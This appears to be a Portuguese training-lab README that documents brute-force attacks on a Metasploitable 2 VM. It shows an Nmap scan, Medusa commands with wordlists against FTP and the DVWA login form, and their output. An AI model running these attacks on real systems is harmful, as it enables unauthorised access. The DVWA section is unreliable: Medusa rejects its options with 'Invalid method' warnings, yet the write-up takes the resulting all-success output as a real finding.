# 🛡️ Simulação de Ataques de Força Bruta com Medusa e Kali Linux

Este repositório documenta a implementação prática de testes de invasão (Pentest) em ambiente controlado, utilizando **Kali Linux** como máquina atacante e **Metasploitable 2** como alvo vulnerável, conforme proposto no desafio da **DIO (Digital Innovation One)**.

---

## 🖥️ Configuração do Ambiente

O laboratório foi estruturado utilizando o **Oracle VM VirtualBox** com duas máquinas virtuais comunicando-se exclusivamente através de uma rede isolada (**Host-Only Adapter**), garantindo segurança durante os testes:

* **Máquina Atacante:** Kali Linux
* **Máquina Alvo:** Metasploitable 2 (`192.168.56.102`)
* **Tipo de Rede:** Host-Only (`vboxnet0`)

---

## 🔍 Fase 1: Reconhecimento e Enumeração de Serviços (Nmap)

Antes de executar qualquer tentativa de exploração ou força bruta, foi realizada uma varredura de portas e detecção de versões de serviços utilizando o **Nmap** para mapear a superfície de ataque do alvo.

### Comando Executado:
```bash
nmap -sV 192.168.56.102

Starting Nmap 7.99 ( [https://nmap.org](https://nmap.org) ) at 2026-11-15 01:11 -0300
Nmap scan report for 192.168.56.102
Host is up (0.000097s latency).
Not shown: 977 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
53/tcp   open  domain      ISC BIND 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp  open  exec        netkit-rsh rexecd
513/tcp  open  login       OpenBSD or Solaris rlogind
514/tcp  open  shell       Netkit rshd
1099/tcp open  java-rmi    GNU Classpath grmiregistry
1524/tcp open  bindshell   Metasploitable root shell
2049/tcp open  nfs         2-4 (RPC #100003)
2121/tcp open  ftp         ProFTPD 1.3.1
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp open  vnc         VNC (protocol 3.3)
6000/tcp open  X11         (access denied)
6667/tcp open  irc         UnrealIRCd
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
MAC Address: 08:00:27:B3:6F:32 (Oracle VirtualBox virtual NIC)
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Veja a evidência da varredura na pasta [Images](images/1-find-ports.png).

## ⚔️ Fase 2: Ataque de Força Bruta no Serviço FTP (Porta 21)

Utilizando a ferramenta **Medusa**, realizamos um ataque de força bruta contra o serviço FTP (`vsftpd 2.3.4`) mapeado na porta 21 do Metasploitable 2.

### 2.1. Criação das Wordlists

Primeiro, criamos os arquivos contendo os usuários e as senhas candidatas a serem testadas:

* **Arquivo de Usuários (`users.txt`):**

```bash
echo -e 'user\nmsfadmin\nadmin\nroot' > users.txt
```

* **Arquivo de Senhas (`pass.txt`):**

```bash
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
```

### 2.2. Execução do Medusa

```bash
medusa -h 192.168.56.102 -U users.txt -P pass.txt -M ftp -t 6
```

### Retorno Obtido (Sucesso):

```text
Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

2026-11-15 01:19:42 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: 123456 (1 of 4 complete)
2026-11-15 01:19:42 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: password (2 of 4 complete)
2026-11-15 01:19:42 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: qwerty (3 of 4 complete)
2026-11-15 01:19:42 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: msfadmin (4 of 4 complete)
2026-11-15 01:19:42 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (2 of 4, 1 complete) Password: 123456 (1 of 4 complete)
2026-11-15 01:19:42 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (2 of 4, 1 complete) Password: password (2 of 4 complete)
2026-11-15 01:19:42 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: msfadmin (3 of 4 complete)
2026-11-15 01:19:42 ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS]
2026-11-15 01:19:46 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (2 of 4, 4 complete) Password: qwerty (4 of 4 complete)
2026-11-15 01:19:46 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (3 of 4, 4 complete) Password: 123456 (1 of 4 complete)
2026-11-15 01:19:46 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (3 of 4, 4 complete) Password: password (2 of 4 complete)
2026-11-15 01:19:46 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (3 of 4, 4 complete) Password: qwerty (3 of 4 complete)
2026-11-15 01:19:46 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (3 of 4, 4 complete) Password: msfadmin (4 of 4 complete)
2026-11-15 01:19:46 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: 123456 (1 of 4 complete)
2026-11-15 01:19:49 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: password (2 of 4 complete)
2026-11-15 01:19:49 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: qwerty (3 of 4 complete)
2026-11-15 01:19:49 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: msfadmin (4 of 4 complete)
```

### 2.3. Validação do Acesso

Após identificar as credenciais válidas (`msfadmin` / `msfadmin`), realizamos a conexão direta via cliente FTP para comprovar o acesso ao sistema:

```bash
ftp 192.168.56.102
```

#### Evidência da Conexão e Comando `pwd`:

```text
Connected to 192.168.56.102.
220 (vsFTPd 2.3.4)
Name (192.168.56.102:nevola): msfadmin
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> pwd
Remote directory: /home/msfadmin
```

### Análise do Resultado:

O ataque foi bem-sucedido ao testar a combinação do usuário **`msfadmin`** com a senha **`msfadmin`**, e a validação posterior confirmou o acesso completo ao diretório remoto (`/home/msfadmin`), evidenciando o risco crítico do uso de credenciais padrão em serviços expostos.

Veja a evidência da varredura na pasta [Images](images/2-medusa-ftp.png).

## 🌐 Fase 3: Ataque de Força Bruta no DVWA (Aplicação Web)

Utilizando a ferramenta **Medusa**, realizamos um teste de força bruta direcionado ao formulário de autenticação da aplicação web vulnerável **DVWA (Damn Vulnerable Web Application)** hospedada na porta 80 do Metasploitable 2.

### 3.1. Preparação das Wordlists

Utilizamos os mesmos arquivos de credenciais criados anteriormente (`users.txt` e `pass.txt`):

* **Arquivo de Usuários (`users.txt`):**

```bash
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
```

* **Arquivo de Senhas (`pass.txt`):**

```bash
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
```

### 3.2. Execução do Medusa (Módulo HTTP)

Para atacar o formulário web do DVWA (`/dvwa/login.php`), configuramos o Medusa com os parâmetros de página, campos do formulário e identificação de falha:

```bash
medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http \
-m PAGE:'/dvwa/login.php' \
-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' -t 6
```

### 3.3. Retorno Obtido (Sucesso):

```text
Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

WARNING: Invalid method: PAGE.
WARNING: Invalid method: FORM.
WARNING: Invalid method: FAIL=Login failed.
...
2026-11-15 01:34:25 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: 123456 (1 of 4 complete)
2026-11-15 01:34:25 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: user Password: 123456 [SUCCESS]
2026-11-15 01:34:25 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (1 of 4, 2 complete) Password: qwerty (2 of 4 complete)
2026-11-15 01:34:25 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: user Password: qwerty [SUCCESS]
2026-11-15 01:34:25 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (1 of 4, 3 complete) Password: password (3 of 4 complete)
2026-11-15 01:34:25 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: user Password: password [SUCCESS]
2026-11-15 01:34:25 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (1 of 4, 4 complete) Password: msfadmin (4 of 4 complete)
2026-11-15 01:34:25 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: user Password: msfadmin [SUCCESS]
2026-11-15 01:34:25 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (2 of 4, 6 complete) Password: 123456 (1 of 4 complete)
2026-11-15 01:34:25 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: msfadmin Password: 123456 [SUCCESS]
2026-11-15 01:34:25 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (2 of 4, 7 complete) Password: password (2 of 4 complete)
2026-11-15 01:34:25 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: msfadmin Password: password [SUCCESS]
2026-11-15 01:34:25 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (2 of 4, 8 complete) Password: qwerty (3 of 4 complete)
2026-11-15 01:34:25 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: msfadmin Password: qwerty [SUCCESS]
2026-11-15 01:34:25 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (2 of 4, 9 complete) Password: msfadmin (4 of 4 complete)
2026-11-15 01:34:25 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS]
2026-11-15 01:34:25 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (3 of 4, 10 complete) Password: 123456 (1 of 4 complete)
2026-11-15 01:34:25 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: admin Password: 123456 [SUCCESS]
2026-11-15 01:34:25 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (3 of 4, 11 complete) Password: password (2 of 4 complete)
2026-11-15 01:34:25 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: admin Password: password [SUCCESS]
2026-11-15 01:34:25 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: root (4 of 4, 12 complete) Password: password (1 of 4 complete)
2026-11-15 01:34:25 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: root Password: password [SUCCESS]
2026-11-15 01:34:25 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: root (4 of 4, 13 complete) Password: 123456 (2 of 4 complete)
2026-11-15 01:34:25 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: root Password: 123456 [SUCCESS]
2026-11-15 01:34:25 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: root (4 of 4, 14 complete) Password: qwerty (3 of 4 complete)
2026-11-15 01:34:25 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: root Password: qwerty [SUCCESS]
```

### 3.4. Análise do Resultado:

Como a aplicação web DVWA no nível de segurança "Low" não implementa mecanismos robustos de proteção contra força bruta (como CAPTCHA ou bloqueio por limite de tentativas), o Medusa validou com sucesso diversas combinações de credenciais padrão, demonstrando a vulnerabilidade do sistema web.

Veja a evidência da varredura na pasta [Images](images/4-acess-form-web.png).
